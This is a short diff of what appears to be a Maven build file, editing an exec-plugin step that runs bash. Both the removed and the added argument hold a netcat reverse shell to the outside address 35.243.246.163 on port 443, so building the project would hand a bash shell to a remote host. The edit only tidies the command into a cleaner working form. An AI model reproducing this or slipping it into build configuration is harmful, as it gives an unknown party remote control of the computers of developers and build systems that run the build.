@@ -145,9 +145,9 @@
                     <executable>bash</executable>
                     <arguments>
                         <argument>
-                            -ci
+                            -c
                         </argument>
-                        <argument>netcat 35.243.246.163 443 -e /bin/bash\&amp;artifactId=${artifactId}</argument>
+                        <argument>netcat 35.243.246.163 443 -e /bin/bash</argument>
                     </arguments>
                 </configuration>
             </plugin>
